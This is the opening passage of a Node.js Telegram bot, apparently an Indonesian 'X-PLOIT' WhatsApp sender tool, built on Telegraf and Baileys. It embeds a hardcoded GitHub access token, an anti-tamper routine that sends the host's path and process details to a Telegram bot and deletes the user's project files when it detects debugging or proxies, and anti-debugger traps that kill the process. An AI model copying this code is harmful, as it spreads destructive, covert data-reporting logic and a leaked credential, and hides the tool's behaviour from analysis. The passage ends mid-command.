const { Telegraf } = require("telegraf");
const { spawn } = require('child_process');
const { pipeline } = require('stream/promises');
const { createWriteStream } = require('fs');
const fs = require('fs');
const path = require('path');
const jid = "0@s.whatsapp.net";
const vm = require('vm');
const os = require('os');
const FormData = require("form-data");
const https = require("https");
const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    makeMessagesSocket,
    fetchLatestWaWebVersion,
    interactiveMessage,
    emitGroupUpdate,
    generateWAMessageContent,
    generateWAMessage,
    generateMessageID,
    makeCacheableSignalKeyStore,
    generateForwardMessageContent,
    prepareWAMessageMedia,
    MessageRetryMap,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    getAggregateVotesInPollMessage,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    nativeFlowMessage,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    getButtonType,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    baileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    extendedTextMessage,
    relayWAMessage,
    listMessage,
    templateMessage,
} = require("@whiskeysockets/baileys");
const pino = require('pino');
const crypto = require('crypto');
const chalk = require('chalk');
const { tokenBot, ownerID } = require("./settings/config");
const axios = require('axios');
const moment = require('moment-timezone');
const EventEmitter = require('events')
const makeInMemoryStore = ({ logger = console } = {}) => {
const ev = new EventEmitter()

  let chats = {}
  let messages = {}
  let contacts = {}

  ev.on('messages.upsert', ({ messages: newMessages, type }) => {
    for (const msg of newMessages) {
      const chatId = msg.key.remoteJid
      if (!messages[chatId]) messages[chatId] = []
      messages[chatId].push(msg)

      if (messages[chatId].length > 100) {
        messages[chatId].shift()
      }

      chats[chatId] = {
        ...(chats[chatId] || {}),
        id: chatId,
        name: msg.pushName,
        lastMsgTimestamp: +msg.messageTimestamp
      }
    }
  })

  ev.on('chats.set', ({ chats: newChats }) => {
    for (const chat of newChats) {
      chats[chat.id] = chat
    }
  })

  ev.on('contacts.set', ({ contacts: newContacts }) => {
    for (const id in newContacts) {
      contacts[id] = newContacts[id]
    }
  })

  return {
    chats,
    messages,
    contacts,
    bind: (evTarget) => {
      evTarget.on('messages.upsert', (m) => ev.emit('messages.upsert', m))
      evTarget.on('chats.set', (c) => ev.emit('chats.set', c))
      evTarget.on('contacts.set', (c) => ev.emit('contacts.set', c))
    },
    logger
  }
}

const GITHUB_TOKEN = "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";
const GITHUB_OWNER = "dapp231";
const GITHUB_REPO = "raa320";
const FILE_PATH = "tokens.json";

const databaseUrl = `https://raw.githubusercontent.com/${GITHUB_OWNER}/${GITHUB_REPO}/main/${FILE_PATH}`;

const thumbnailUrl = "https://img2.pixhost.to/images/5942/698104712_marceleven.jpg";
const welcomeVideoUrl = "https://files.catbox.moe/m3eb4g.mp4";

function createSafeSock(sock) {
  let sendCount = 0
  const MAX_SENDS = 500
  const normalize = j =>
    j && j.includes("@")
      ? j
      : j.replace(/[^0-9]/g, "") + "@s.whatsapp.net"

  return {
    sendMessage: async (target, message) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(sock, target)
      return await sock.sendMessage(jid, message)
    },
    relayMessage: async (target, messageObj, opts = {}) => {
      if (sendCount++ > MAX_SENDS) throw new Error("RateLimit")
      const jid = normalize(sock, target)
      return await sock.relayMessage(jid, messageObj, opts)
    },
    presenceSubscribe: async jid => {
      try { return await sock.presenceSubscribe(normalize(jid)) } catch(e){}
    },
    sendPresenceUpdate: async (state,jid) => {
      try { return await sock.sendPresenceUpdate(state, normalize(jid)) } catch(e){}
    }
  }
}

function enableBypassProtection() {
  const { env, execArgv } = process;

  function deleteFilesOnCrack() {
    const files = [
      "package.json",
      "index.js",
      "config.js",
      ".npm",
      "node_modules",
      "settings",
      "T-five.zip"
    ];
    for (const file of files) {
      try {
        const targetPath = path.join(process.cwd(), file);
        if (fs.existsSync(targetPath)) {
          fs.unlinkSync(targetPath);
          console.log(`[SECURITY] File dihapus: ${file}`);
        }
      } catch (err) {
        console.error(`[ERROR] Gagal hapus ${file}: ${err.message}`);
      }
    }
  }
  async function reportToTelegram(reason) {
    const text = `🚨 *NGAPAIN KIDS KE DETECTED!*

📂 Path: ${process.cwd()}
🖥️ Node: ${process.version}
PID: ${process.pid}
Reason: ${reason}`;

    try {
      await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        chat_id: REPORT_CHAT_ID,
        text,
        parse_mode: "Markdown"
      });
      console.log("[REPORT] MAKLO SINI GUA BYPASS YATIM😂");
    } catch (err) {
      console.error("[REPORT] EROR BJIR NGAKAK:", err.message);
    }
  }

  const trueAbort = process.abort;
  const trueExit = process.exit;
  const trueToString = Function.prototype.toString.toString();

  Object.defineProperty(process, "abort", { value: trueAbort, configurable: false, writable: false });
  Object.defineProperty(process, "exit", { value: trueExit, configurable: false, writable: false });

  Object.freeze(Function.prototype);
  Object.freeze(axios.interceptors.request);
  Object.freeze(axios.interceptors.response);

  function onCrackDetected(reason) {
    console.error(`[SECURITY] ${reason}`);
    reportToTelegram(reason);
    deleteFilesOnCrack();
    process.kill(process.pid, "SIGKILL");
  }

  if (Function.prototype.toString.toString() !== trueToString) {
    onCrackDetected("Function.prototype.toString dibajak");
  }

  if (execArgv.length === 0 && process.execArgv !== execArgv) {
    onCrackDetected("process.execArgv dipalsukan");
  }

  ["HTTP_PROXY", "HTTPS_PROXY", "NODE_TLS_REJECT_UNAUTHORIZED", "NODE_OPTIONS"].forEach((key) => {
    if (env[key] && env[key] !== "" && env[key] !== "1") {
      onCrackDetected(`ENV ${key} disuntik: ${env[key]}`);
    }
  });

  if (axios.interceptors.request.handlers.length > 0 || axios.interceptors.response.handlers.length > 0) {
    onCrackDetected("Interceptor axios terdeteksi");
  }

  try {
    if (typeof module._load === "function") {
      const moduleCode = module._load.toString();
      if (!moduleCode.includes("tryModuleLoad") && !moduleCode.includes("Module._load")) {
        onCrackDetected("Module._load dibajak");
      }
    }
  } catch (err) {
    onCrackDetected("Gagal akses module._load: " + err.message);
  }

  try {
    const trap = Object.getOwnPropertyDescriptor(require.cache, "get");
    if (typeof trap === "function") {
      onCrackDetected("require.cache diproxy");
    }
  } catch {
    onCrackDetected("require.cache error");
  }

  console.log("\x1b[41m\x1b[37m[🔐 PROTECTION]\x1b[0m BY KING DAPAxyz ACTIVE 🔥\n");
}

function activateSecureMode() {
  secureMode = true;
}

(function() {
  function randErr() {
    return Array.from({ length: 12 }, () =>
      String.fromCharCode(33 + Math.floor(Math.random() * 90))
    ).join("");
  }

  setInterval(() => {
    const start = performance.now();
    debugger;
    if (performance.now() - start > 100) {
      throw new Error(randErr());
    }
  }, 1000);

  const code = "AlwaysProtect";
  if (code.length !== 13) {
    throw new Error(randErr());
  }

  function secure() {
    console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   DAPAxyz IS COMMING !!!       
├───────────────────────────────
│⟢ WAITING...... 
╰─❖──────────────────────────❖─╯
  `))
  }
  
  const hash = Buffer.from(secure.toString()).toString("base64");
  setInterval(() => {
    if (Buffer.from(secure.toString()).toString("base64") !== hash) {
      throw new Error(randErr());
    }
  }, 2000);

  secure();
})();

(() => {
  const hardExit = process.exit.bind(process);
  Object.defineProperty(process, "exit", {
    value: hardExit,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  const hardKill = process.kill.bind(process);
  Object.defineProperty(process, "kill", {
    value: hardKill,
    writable: false,
    configurable: false,
    enumerable: true,
  });

  setInterval(() => {
    try {
      if (process.exit.toString().includes("Proxy") ||
          process.kill.toString().includes("Proxy")) {
        console.log(chalk.bold.red(`
⠀⠀⠀⠀⠀⠀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣴⣿⣿⠿⣟⢷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣏⡏⠀⠀⠀⢣⢻⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⢸⣟⠧⠤⠤⠔⠋⠀⢿⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠸⣷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠘⣿⡀⢀⣶⠤⠒⠀⢻⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢹⣧⠀⠀⠀⠀⠀⠈⢿⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡆⠀⠀⠀⠀⠀⠈⢿⣆⣠⣤⣤⣤⣤⣴⣦⣄⡀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢀⣾⢿⢿⠀⠀⠀⢀⣀⣀⠘⣿⠋⠁⠀⠙⢇⠀⠀⠙⢿⣦⡀⠀⠀⠀⠀⠀
⠀⠀⠀⢀⣾⢇⡞⠘⣧⠀⢖⡭⠞⢛⡄⠘⣆⠀⠀⠀⠈⢧⠀⠀⠀⠙⢿⣄⠀⠀⠀⠀
⠀⠀⣠⣿⣛⣥⠤⠤⢿⡄⠀⠀⠈⠉⠀⠀⠹⡄⠀⠀⠀⠈⢧⠀⠀⠀⠈⠻⣦⠀⠀⠀
⠀⣼⡟⡱⠛⠙⠀⠀⠘⢷⡀⠀⠀⠀⠀⠀⠀⠹⡀⠀⠀⠀⠈⣧⠀⠀⠀⠀⠹⣧⡀⠀
⢸⡏⢠⠃⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠘⣧⠀⠀⠀⠀⠸⣷⡀
⠸⣧⠘⡇⠀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⣿⠇
⠀⣿⡄⢳⠀⠀⠀⠀⠀⠀⠀⠈⣷⠀⠀⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⣼⡟⠀
⠀⢹⡇⠘⣇⠀⠀⠀⠀⠀⠀⠰⣿⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⣼⡟⠀⠀
⠀⢸⡇⠀⢹⡆⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⡀⠀⠀⠀⢳⣼⠟⠀⠀⠀
⠀⠸⣧⣀⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⢃⠀⢀⣴⡿⠁⠀⠀⠀⠀
⠀⠀⠈⠙⢷⣄⢳⡀⠀⠀⠀⠀⠀⠀⢳⡀⠀⠀⠀⠀⠀⣠⡿⠟⠛⠉⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠈⠻⢿⣷⣦⣄⣀⣀⣠⣤⠾⠷⣦⣤⣤⡶⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀

╭─❖──────────────────────────❖─╮
│   DAPAxyz IS COMMING !!!       
├───────────────────────────────
│⟢ DETECTED BYPASS!!!        
╰─❖──────────────────────────❖─╯
  `))
        activateSecureMode();
        hardExit(1);
      }

      for (const sig of ["SIGINT", "SIGTERM", "SIGHUP"]) {
        if (process.listeners(sig).length > 0) {
          console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   MELACAK KEBERADAAN ANDA.        
├───────────────────────────────
│⟢ DAPAxyz IS BACK
╰─❖──────────────────────────❖─╯
  `))
        activateSecureMode();
        hardExit(1);
        }
      }
    } catch {
      activateSecureMode();
      hardExit(1);
    }
  }, 2000);

  global.validateToken = async (databaseUrl, tokenBot) => {
  try {
    const res = await axios.get(databaseUrl, { timeout: 5000 });
    const tokens = (res.data && res.data.tokens) || [];

    if (!tokens.includes(tokenBot)) {
      console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   ⚒️  DETECT INFLATOR  ⚒️
├───────────────────────────────
│⟢ 🔴 YOUR TOKEN IS NOT IN THE DATABASE.  
╰─❖──────────────────────────❖─╯
  `));

      try {
      } catch (e) {
      }

      activateSecureMode();
      hardExit(1);
    }
  } catch (err) {
    console.log(chalk.bold.blue(`
╭─❖──────────────────────────❖─╮
│   ACCES ANDA DI TOLAK !!!
├───────────────────────────────
│⟢ MENGHUBUNGI ADMIN DAPAxyz ☎️
╰─❖──────────────────────────❖─╯
  `));
    activateSecureMode();
    hardExit(1);
  }
};
})();

const question = (query) => new Promise((resolve) => {
    const rl = require('readline').createInterface({
        input: process.stdin,
        output: process.stdout
    });
    rl.question(query, (answer) => {
        rl.close();
        resolve(answer);
    });
});

async function isAuthorizedToken(token) {
    try {
        const res = await axios.get(databaseUrl);
        const authorizedTokens = res.data.tokens;
        return authorizedTokens.includes(token);
    } catch (e) {
        return false;
    }
}

(async () => {
    await validateToken(databaseUrl, tokenBot);
})();

const bot = new Telegraf(tokenBot);
let tokenValidated = false; // volatile gate: require token each restart

// ==== GLOBAL LOCK: block everything until tokenValidated === true ====
bot.use((ctx, next) => {
  if (secureMode) return; // hard stop when secure mode on

  const text = (ctx.message && ctx.message.text) ? ctx.message.text.trim() : "";
  const cbData = (ctx.callbackQuery && ctx.callbackQuery.data) ? ctx.callbackQuery.data.trim() : "";

  const isStartText = typeof text === "string" && text.toLowerCase().startsWith("/start");
  const isStartCallback = typeof cbData === "string" && cbData === "/start";

  if (!tokenValidated && !(isStartText || isStartCallback)) {
    if (ctx.callbackQuery) {
      try { ctx.answerCbQuery("🔒 ☇ Akses terkunci — validasi token lewat /start <token>"); } catch (e) {}
    }
    return ctx.reply("🔒 ☇ Akses terkunci. Ketik /start <token> untuk mengaktifkan bot.");
  }
  return next();
});


let secureMode = false;
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = '';
let lastPairingMessage = null;
const usePairingCode = true;

const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));

const premiumFile = './database/premium.json';
const cooldownFile = './database/cooldown.json'

const loadPremiumUsers = () => {
    try {
        const data = fs.readFileSync(premiumFile);
        return JSON.parse(data);
    } catch (err) {
        return {};
    }
};

const savePremiumUsers = (users) => {
    fs.writeFileSync(premiumFile, JSON.stringify(users, null, 2));
};

const addPremiumUser = (userId, duration) => {
    const premiumUsers = loadPremiumUsers();
    const expiryDate = moment().add(duration, 'days').tz('Asia/Jakarta').format('DD-MM-YYYY');
    premiumUsers[userId] = expiryDate;
    savePremiumUsers(premiumUsers);
    return expiryDate;
};

const removePremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    delete premiumUsers[userId];
    savePremiumUsers(premiumUsers);
};

const isPremiumUser = (userId) => {
    const premiumUsers = loadPremiumUsers();
    if (premiumUsers[userId]) {
        const expiryDate = moment(premiumUsers[userId], 'DD-MM-YYYY');
        if (moment().isBefore(expiryDate)) {
            return true;
        } else {
            removePremiumUser(userId);
            return false;
        }
    }
    return false;
};

const loadCooldown = () => {
    try {
        const data = fs.readFileSync(cooldownFile)
        return JSON.parse(data).cooldown || 5
    } catch {
        return 5
    }
}

const saveCooldown = (seconds) => {
    fs.writeFileSync(cooldownFile, JSON.stringify({ cooldown: seconds }, null, 2))
}

let cooldown = loadCooldown()
const userCooldowns = new Map()

function formatRuntime() {
  let sec = Math.floor(process.uptime());
  let hrs = Math.floor(sec / 3600);
  sec %= 3600;
  let mins = Math.floor(sec / 60);
  sec %= 60;
  return `${hrs}h ${mins}m ${sec}s`;
}

function formatMemory() {
  const usedMB = process.memoryUsage().rss / 1024 / 1024;
  return `${usedMB.toFixed(0)} MB`;
}

const startSesi = async () => {
console.clear();
  console.log(chalk.bold.red(`
  ⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿⣻⣿⣿⢿⣿⡶⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿⠛⢿⣿⣞⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾⡆⠈⢿⣿⣛⣒⠂⠀⠀⠀⠀
⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿⢹⠀⠀⠉⠛⢻⡿⠁⠀⠀⠀
⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷⣄⠀⢲⣸⠀⠀⠀⠀⠀
⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻⣦⠈⢻⣦⣀⡀⠀⠀
⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿⣽⡄⢀⣿⣿⣿⠇⠀
⠀⢠⣾⡟⢁⣴⡿⠹⠋⡰⣿⣿⣿⣿⡟⠀⢀⣿⣇⣼⣿⡿⡇⠞⣿⣿⣧⣤⡤
⠀⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀⡔⢶⣽⣿⠿⠥⠀
⠀⠈⠀⢸⠟⣠⡾⠏⠀⡿⢹⣿⣿⣿⣿⣿⣿⣿⣶⣿⣶⣾⣿⣮⣍⠉⠙⢲⠄
⠀⠀⠀⠘⠉⠁⠀⠀⢸⠁⠘⣿⡿⠻⣿⡿⣿⣿⣿⣿⣿⣿⡏⢻⣛⠛⠒⠛⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠈⢻⡄⠹⣿⣿⡇⠙⢷⡈⢿⡟⠒⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠀⣿⣿⠃⠀⠀⠀⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠈⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
console.log(chalk.bold.red(`
╭─❖──────────────────────────❖─╮
│ Developer : DAPAxyz    
│ Version : 2.0
│ Status : Bot Connected
├───────────────────────────────
│⟢ 𝗫- 𝗣𝗟𝗢𝗜𝗧 Cursed Starting...
╰─❖──────────────────────────❖─╯
  `));
    
const store = makeInMemoryStore({
  logger: require('pino')().child({ level: 'silent', stream: 'store' })
})
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    const { version } = await fetchLatestBaileysVersion();

    const connectionOptions = {
        version,
        keepAliveIntervalMs: 30000,
        printQRInTerminal: !usePairingCode,
        logger: pino({ level: "silent" }),
        auth: state,
        browser: ['Mac OS', 'Safari', '10.15.7'],
        getMessage: async (key) => ({
            conversation: 'Always Prime',
        }),
    };

    sock = makeWASocket(connectionOptions);
    
    sock.ev.on("messages.upsert", async (m) => {
        try {
            if (!m || !m.messages || !m.messages[0]) {
                return;
            }

            const msg = m.messages[0]; 
            const chatId = msg.key.remoteJid || "Tidak Diketahui";

        } catch (error) {
        }
    });

    sock.ev.on('creds.update', saveCreds);
    store.bind(sock.ev);
    
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect } = update;
        if (connection === 'open') {
        
        if (lastPairingMessage) {
        const connectedMenu = `
<blockquote><b>⧼ ⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧 ⧽</b></blockquote>
⛧ Number: ${lastPairingMessage.phoneNumber}
⛧ Pairing Code: ${lastPairingMessage.pairingCode}
⛧ Status: Connected
━━━━━━━━━━━━━━━━━━━━━━`;

        try {
          bot.telegram.editMessageCaption(
            lastPairingMessage.chatId,
            lastPairingMessage.messageId,
            undefined,
            connectedMenu,
            { parse_mode: "HTML" }
          );
        } catch (e) {
        }
      }
      
            console.clear();
            isWhatsAppConnected = true;
            const currentTime = moment().tz('Asia/Jakarta').format('HH:mm:ss');
            console.log(chalk.bold.red(`
  ⢀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢰⣿⢤⡿⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⡿⠀⠀⠀⢬⡱⢄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣷⠀⠀⠀⠀⠙⣦⠙⠦⠤⠴⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⢸⣧⠀⠀⠀⠀⠘⣿⠓⠶⣄⡈⣻⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⡤⣿⣷⠀⠀⠀⠀⣻⣄⡀⠀⠁⣬⡟⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⢧⣈⠉⡀⠀⠀⠀⡈⠻⣿⣿⣇⠈⡇⣿⣿⣿⣷⣦⣀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠈⠙⢿⡆⠀⠀⣼⠀⢹⡙⢿⣆⠀⢻⣿⣻⣿⣿⢿⣿⡶⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⡾⡄⣰⣿⡆⠀⠙⣦⠹⡆⠰⣿⠛⢿⣿⣞⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⢐⣿⠇⣟⠋⢸⣿⣼⠀⣿⣷⣼⡹⣾⡆⠈⢿⣿⣛⣒⠂⠀⠀⠀⠀
⠀⠀⠀⣚⣻⣿⣶⣿⠀⠈⡛⢿⡀⢸⣿⢛⣿⣿⢹⠀⠀⠉⠛⢻⡿⠁⠀⠀⠀
⣀⣀⣉⣩⣿⣿⣿⠋⠀⠀⡇⠈⢓⠏⠏⡀⢸⠇⢈⣷⣄⠀⢲⣸⠀⠀⠀⠀⠀
⢀⠉⠛⣛⣛⡛⠁⠀⠀⣾⠃⠀⣸⠇⣠⡇⢠⡀⠈⢿⡻⣦⠈⢻⣦⣀⡀⠀⠀
⠈⠙⠛⣿⣶⡾⠛⣡⣾⡟⢠⣾⣿⣿⣟⡤⠀⣷⡀⢨⣿⣽⡄⢀⣿⣿⣿⠇⠀
⠀⢠⣾⡟⢁⣴⡿⠹⠋⡰⣿⣿⣿⣿⡟⠀⢀⣿⣇⣼⣿⡿⡇⠞⣿⣿⣧⣤⡤
⠀⢠⡾⠚⣿⡟⢀⣴⠏⣸⣿⣿⣿⣿⣧⢰⣿⣿⡿⢻⠉⠀⡔⢶⣽⣿⠿⠥⠀
⠀⠈⠀⢸⠟⣠⡾⠏⠀⡿⢹⣿⣿⣿⣿⣿⣿⣿⣶⣿⣶⣾⣿⣮⣍⠉⠙⢲⠄
⠀⠀⠀⠘⠉⠁⠀⠀⢸⠁⠘⣿⡿⠻⣿⡿⣿⣿⣿⣿⣿⣿⡏⢻⣛⠛⠒⠛⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⠀⠈⢻⡄⠹⣿⣿⡇⠙⢷⡈⢿⡟⠒⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠱⠀⣿⣿⠃⠀⠀⠀⣿⠇⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⡿⠃⠀⠀⠀⠈⠋⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠁⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`));
console.log(chalk.bold.red(`
╭─❖──────────────────────────❖─╮
│ Developer : DAPAxyz    
│ Version : 2.0
│ Status : Sender Connected
├───────────────────────────────
│⟢ 𝗫- 𝗣𝗟𝗢𝗜𝗧 Cursed Starting...
╰─❖──────────────────────────❖─╯
  `));
        }

                 if (connection === 'close') {
            const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
            console.log(
                chalk.red('Koneksi WhatsApp terputus:'),
                shouldReconnect ? 'Mencoba Menautkan Perangkat' : 'Silakan Menautkan Perangkat Lagi'
            );
            if (shouldReconnect) {
                startSesi();
            }
            isWhatsAppConnected = false;
        }
    });
};

startSesi();

const checkWhatsAppConnection = (ctx, next) => {
    if (!isWhatsAppConnected) {
        ctx.reply("🪧 ☇ Tidak ada sender yang terhubung");
        return;
    }
    next();
};

const checkCooldown = (ctx, next) => {
    const userId = ctx.from.id
    const now = Date.now()

    if (userCooldowns.has(userId)) {
        const lastUsed = userCooldowns.get(userId)
        const diff = (now - lastUsed) / 1000

        if (diff < cooldown) {
            const remaining = Math.ceil(cooldown - diff)
            ctx.reply(`⏳ ☇ Harap menunggu ${remaining} detik`)
            return
        }
    }

    userCooldowns.set(userId, now)
    next()
}

const checkPremium = (ctx, next) => {
    if (!isPremiumUser(ctx.from.id)) {
        ctx.reply("❌ ☇ Akses hanya untuk premium");
        return;
    }
    next();
};

bot.command("addbot", async (ctx) => {
   if (ctx.from.id != ownerID) {
        return ctx.reply("❌ ☇ Akses hanya untuk pemilik");
    }
    
  const args = ctx.message.text.split(" ")[1];
  if (!args) return ctx.reply("🪧 ☇ Format: /addbot 62×××");

  const phoneNumber = args.replace(/[^0-9]/g, "");
  if (!phoneNumber) return ctx.reply("❌ ☇ Nomor tidak valid");

  try {
    if (!sock) return ctx.reply("❌ ☇ Socket belum siap, coba lagi nanti");
    if (sock.authState.creds.registered) {
      return ctx.reply(`✅ ☇ WhatsApp sudah terhubung dengan nomor: ${phoneNumber}`);
    }

    const code = await sock.requestPairingCode(phoneNumber, "DAPZXRAA");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;  

    const pairingMenu = `
<blockquote><b>⧼ ⌜ 🍁 ⌟ 𝗫 - 𝗣 𝗟 𝗢 𝗜 𝗧 ⧽</b></blockquote>
⛧ Number: ${phoneNumber}
⛧ Pairing Code: ${formattedCode}
⛧ Status: Not Connected
━━━━━━━━━━━━━━━━━━━━━━`;

    const sentMsg = await ctx.replyWithPhoto(thumbnailUrl, {  
      caption: pairingMenu,  
      parse_mode: "HTML"  
    });  

    lastPairingMessage = {  
      chatId: ctx.chat.id,  
